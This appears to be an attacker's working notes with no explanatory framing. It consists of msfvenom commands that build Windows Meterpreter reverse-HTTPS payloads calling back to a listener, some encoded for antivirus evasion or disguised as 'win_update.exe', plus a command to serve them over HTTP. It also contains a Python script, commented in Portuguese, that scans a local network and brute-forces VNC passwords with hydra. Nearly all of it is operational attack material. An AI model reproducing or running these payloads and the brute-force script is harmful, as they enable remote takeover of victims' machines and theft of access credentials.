msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

#!/usr/bin/env python3
import os
import subprocess

def find_targets():
    print("[+] Escaneando a rede para encontrar hosts ativos...")
    scan_result = subprocess.run(['nmap', '-sn', '192.168.1.0/24'], capture_output=True, text=True)
    ips = []
    for line in scan_result.stdout.split('\n'):
        if 'Nmap scan report for' in line:
            ip = line.split()[-1]
            ips.append(ip)
    return ips

def brute_force_vnc(target_ip, wordlist):
    print(f"[+] Iniciando brute force no VNC ({target_ip}:5900)...")
    hydra_command = [
        'hydra', '-s', '5900', '-P', wordlist, '-t', '4', '-V', target_ip, 'vnc'
    ]
    subprocess.run(hydra_command)

if __name__ == "__main__":
    wordlist_path = "./wordlist_atibaia_vnc.txt"
    if not os.path.exists(wordlist_path):
        print("[!] Wordlist não encontrada. Coloque o arquivo na mesma pasta do script com o nome 'wordlist_atibaia_vnc.txt'")
        exit(1)

    targets = find_targets()
    if not targets:
        print("[!] Nenhum alvo encontrado na rede.")
        exit(1)

    print("[+] Hosts encontrados na rede:")
    for i, ip in enumerate(targets):
        print(f"[{i}] {ip}")

    escolha = input("Digite o número do IP alvo: ")
    try:
        alvo_ip = targets[int(escolha)]
    except:
        print("[!] Entrada inválida.")
        exit(1)

    brute_force_vnc(alvo_ip, wordlist_path)
